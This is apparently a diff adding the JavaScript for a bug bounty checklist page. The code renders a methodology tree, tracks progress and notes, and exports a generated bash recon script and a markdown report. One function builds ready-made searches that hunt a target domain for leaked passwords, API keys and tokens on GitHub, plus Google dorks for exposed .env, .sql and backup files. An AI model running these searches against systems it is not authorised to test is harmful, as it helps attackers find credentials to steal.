+    function renderTree(preserveExpansion = false) {
+      const expandedSet = preserveExpansion ? getExpandedNodeIds() : new Set(['recon_wildcard']);
+      const container = document.getElementById('treeContainer');
+      container.innerHTML = bugBountyTreeData.map(node => createTreeNodeHTML(node, expandedSet)).join('');
+      updateProgressStats();
+      applyFilters();
+    }
+
+    function toggleNodeCollapse(nodeId) {
+      const childrenDiv = document.getElementById(`children-${nodeId}`);
+      const arrowIcon = document.getElementById(`arrow-${nodeId}`);
+      if (childrenDiv) {
+        childrenDiv.classList.toggle('hidden');
+        if (arrowIcon) arrowIcon.classList.toggle('rotate-90');
+      }
+    }
+
+    function expandAllNodes() {
+      document.querySelectorAll('.tree-node-children').forEach(el => el.classList.remove('hidden'));
+      document.querySelectorAll('[id^="arrow-"]').forEach(el => el.classList.add('rotate-90'));
+    }
+
+    function collapseAllNodes() {
+      document.querySelectorAll('.tree-node-children').forEach(el => el.classList.add('hidden'));
+      document.querySelectorAll('[id^="arrow-"]').forEach(el => el.classList.remove('rotate-90'));
+    }
+
+    function toggleCheckItem(nodeId, isChecked) {
+      checklistState[nodeId] = isChecked;
+      saveState();
+      renderTree(true);
+    }
+
+    function toggleFlagItem(nodeId) {
+      flaggedState[nodeId] = !flaggedState[nodeId];
+      saveState();
+      renderTree(true);
+    }
+
+    function toggleNoteBox(nodeId) {
+      openNotes[nodeId] = !openNotes[nodeId];
+      const box = document.getElementById(`note-box-${nodeId}`);
+      if (box) box.classList.toggle('hidden');
+    }
+
+    function updateItemNote(nodeId, val) {
+      if (val.trim()) {
+        notesState[nodeId] = val;
+      } else {
+        delete notesState[nodeId];
+      }
+      saveState();
+    }
+
+    // Filter Mode & Search Engine
+    function setFilterMode(mode) {
+      filterMode = mode;
+      ['all', 'todo', 'done', 'flagged', 'cli'].forEach(m => {
+        const btn = document.getElementById(`flt-${m}`);
+        if (m === mode) {
+          btn.className = 'px-2.5 py-1 rounded bg-emerald-500 text-black font-semibold transition';
+        } else {
+          btn.className = 'px-2.5 py-1 rounded text-slate-300 hover:text-white transition';
+        }
+      });
+      applyFilters();
+    }
+
+    function applyFilters() {
+      const query = document.getElementById('globalSearchInput').value.toLowerCase().trim();
+      const isFiltering = query.length > 0 || filterMode !== 'all';
+
+      if (isFiltering) expandAllNodes();
+
+      document.querySelectorAll('.tree-node-item').forEach(item => {
+        const text = item.getAttribute('data-search-text') || '';
+        const isChecked = item.getAttribute('data-checked') === 'true';
+        const isFlagged = item.getAttribute('data-flagged') === 'true';
+        const hasCli = item.getAttribute('data-has-cli') === 'true';
+
+        let matchesMode = true;
+        if (filterMode === 'todo') matchesMode = !isChecked;
+        if (filterMode === 'done') matchesMode = isChecked;
+        if (filterMode === 'flagged') matchesMode = isFlagged;
+        if (filterMode === 'cli') matchesMode = hasCli;
+
+        const matchesQuery = !query || text.includes(query);
+
+        if (matchesMode && matchesQuery) {
+          item.classList.remove('hidden');
+        } else {
+          item.classList.add('hidden');
+        }
+      });
+
+      // Hide parent groups that have 0 visible children when filtering
+      document.querySelectorAll('.tree-node-group').forEach(group => {
+        const visibleLeaves = group.querySelectorAll('.tree-node-item:not(.hidden)');
+        if (isFiltering && visibleLeaves.length === 0) {
+          group.classList.add('hidden');
+        } else {
+          group.classList.remove('hidden');
+        }
+      });
+    }
+
+    // 1-Click External OSINT Recon URL Launcher
+    function openOsintLink(type) {
+      const d = encodeURIComponent(config.domain);
+      const urls = {
+        crtsh: `https://crt.sh/?q=%25.${d}`,
+        shodan: `https://www.shodan.io/search?query=hostname%3A${d}`,
+        wayback: `https://web.archive.org/cdx/search/cdx?url=*.${d}/*&output=text&fl=original&collapse=urlkey`,
+        github: `https://github.com/search?q=%22${d}%22+%28password+OR+api_key+OR+secret+OR+token%29&type=code`,
+        censys: `https://search.censys.io/search?resource=hosts&q=${d}`,
+        urlscan: `https://urlscan.io/search/#domain%3A${d}`,
+        dork_files: `https://www.google.com/search?q=site:${d}+ext:pdf+OR+ext:doc+OR+ext:xls+OR+ext:sql+OR+ext:bak`,
+        dork_env: `https://www.google.com/search?q=site:${d}+ext:env+OR+ext:yaml+OR+ext:json+OR+inurl:swagger+OR+inurl:api-docs`
+      };
+      if (urls[type]) window.open(urls[type], '_blank', 'noopener');
+    }
+
+    // Export Automated Recon Bash Script (.sh)
+    function exportBashScript() {
+      let lines = [
+        `#!/usr/bin/env bash`,
+        `# ==============================================================================`,
+        `# Automated Recon & Bug Bounty Script generated by OSINT Tree v7.0 Pro`,
+        `# Target Domain: ${config.domain}`,
+        `# Generated: ${new Date().toISOString()}`,
+        `# ==============================================================================`,
+        `set -uo pipefail`,
+        `mkdir -p ./recon_${config.domain.replace(/[^a-zA-Z0-9]/g, '_')}`,
+        `cd ./recon_${config.domain.replace(/[^a-zA-Z0-9]/g, '_')}`,
+        ``
+      ];
+
+      function collectCmds(node) {
+        if (node.children) {
+          lines.push(`\n# --- [ ${node.title} ] ---`);
+          node.children.forEach(collectCmds);
+        } else if (node.cmd && !node.cmd.startsWith('#')) {
+          const cmd = interpolateCmd(node.cmd);
+          lines.push(`echo "[+] Running: ${node.title}"`);
+          lines.push(`${cmd}`);
+        }
+      }
+
+      bugBountyTreeData.forEach(collectCmds);
+      downloadFile(`recon_${config.domain}.sh`, lines.join('\n'), 'text/x-shellscript');
+      showToast('Bash recon script downloaded!');
+    }
+
+    // Export Markdown Engagement Report (.md)
+    function exportMarkdownReport() {
+      let md = [
+        `# Bug Bounty Engagement Report — \`${config.domain}\``,
+        `**Date:** ${new Date().toLocaleDateString()}`,
+        `**Scope:** \`*.${config.domain}\``,
+        ``
+      ];
+
+      const scratch = document.getElementById('globalScratchpad').value.trim();
+      if (scratch) {
+        md.push(`## Global Scratchpad & Scope Notes\n\`\`\`\n${scratch}\n\`\`\`\n`);
+      }
+
+      md.push(`## Flagged Findings & Priority Vectors`);
+      let hasFlags = false;
+      function collectFlags(node) {
+        if (node.children) {
+          node.children.forEach(collectFlags);
+        } else if (flaggedState[node.id] || notesState[node.id]) {
+          hasFlags = true;
+          md.push(`### ${flaggedState[node.id] ? '[FLAGGED] ' : ''}${node.title}`);
+          if (node.cmd) md.push(`- **Command:** \`${interpolateCmd(node.cmd)}\``);
+          if (notesState[node.id]) md.push(`- **PoC / Investigator Notes:**\n\`\`\`\n${notesState[node.id]}\n\`\`\``);
+          md.push(``);
+        }
+      }
+      bugBountyTreeData.forEach(collectFlags);
+      if (!hasFlags) md.push(`_No items flagged or annotated yet._\n`);
+
+      md.push(`## Full Methodology Checklist Progress`);
+      function collectProgress(node, depth = 0) {
+        if (node.children) {
+          md.push(`\n${'#'.repeat(Math.min(depth + 3, 6))} ${node.title}`);
+          node.children.forEach(c => collectProgress(c, depth + 1));
+        } else {
+          const mark = checklistState[node.id] ? 'x' : ' ';
+          md.push(`- [${mark}] **${node.title}**`);
+        }
+      }
+      bugBountyTreeData.forEach(n => collectProgress(n, 0));
+
+      downloadFile(`bugbounty_report_${config.domain}.md`, md.join('\n'), 'text/markdown');
+      showToast('Markdown report exported!');
+    }
+
+    // Export / Import JSON Backup
+    function exportJsonState() {
+      const payload = {
+        version: '7.0',
+        config,
+        checklistState,
+        flaggedState,
+        notesState,
+        scratchpad: document.getElementById('globalScratchpad').value
+      };
+      downloadFile(`osint_tree_${config.domain}_backup.json`, JSON.stringify(payload, null, 2), 'application/json');
+      showToast('JSON backup exported!');
+    }
+
+    function importJsonState(event) {
+      const file = event.target.files[0];
+      if (!file) return;
+      const reader = new FileReader();
+      reader.onload = function(e) {
+        try {
+          const data = JSON.parse(e.target.result);
+          if (data.config) config = { ...config, ...data.config };
+          if (data.checklistState) checklistState = data.checklistState;
+          if (data.flaggedState) flaggedState = data.flaggedState;
+          if (data.notesState) notesState = data.notesState;
+          if (typeof data.scratchpad === 'string') {
+            document.getElementById('globalScratchpad').value = data.scratchpad;
+            saveGlobalScratchpad(data.scratchpad);
+          }
+          document.getElementById('targetDomainInput').value = config.domain;
+          document.getElementById('varWordlist').value = config.wordlist;
+          document.getElementById('varOob').value = config.oob;
+          document.getElementById('varHeader').value = config.header;
+          document.getElementById('varRate').value = config.rate;
+          updateConfig();
+          showToast('Engagement state restored!');
+        } catch (err) {
+          alert('Invalid JSON backup file.');
+        }
+      };
+      reader.readAsText(file);
+    }
+
+    function downloadFile(filename, content, mimeType) {
+      const blob = new Blob([content], { type: mimeType });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = filename;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+    }
+
+    function clearChecklistProgress() {
+      if (confirm('Reset all checklist checkmarks, flags, and notes for this target?')) {
+        checklistState = {};
+        flaggedState = {};
+        notesState = {};
+        openNotes = {};
+        saveState();
+        renderTree(false);
+        showToast('All progress & notes cleared!');
+      }
+    }
+
+    // Clipboard & UI Helpers
+    function copyCodeText(elementId) {
+      const text = document.getElementById(elementId).innerText;
+      copyRawText(text);
+    }
+
+    function copyRawText(text) {
+      const textarea = document.createElement('textarea');
+      textarea.value = text;
+      textarea.style.position = 'fixed';
+      textarea.style.opacity = '0';
+      document.body.appendChild(textarea);
+      textarea.select();
+      try {
+        document.execCommand('copy');
+        showToast('Command copied to clipboard!');
+      } catch (err) {
+        console.error('Copy failed', err);
+      } finally {
+        document.body.removeChild(textarea);
+      }
+    }
+
+    function showToast(msg) {
+      const toast = document.getElementById('toast');
+      document.getElementById('toastMessage').innerText = msg;
+      toast.classList.remove('opacity-0', 'translate-y-4');
+      toast.classList.add('opacity-100', 'translate-y-0');
+      setTimeout(() => {
+        toast.classList.remove('opacity-100', 'translate-y-0');
+        toast.classList.add('opacity-0', 'translate-y-4');
+      }, 2400);
+    }
+
+    function escapeHtml(str) {
+      return String(str).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
+    }
+
+    function escapeJsString(str) {
+      return String(str).replace(/\\/g, '\\\\').replace(/'/g, "\\'");
+    }
+
+    window.onload = function() {
+      loadState();
+      updateConfig();
+    };
+  </script>
+</body>
+</html>
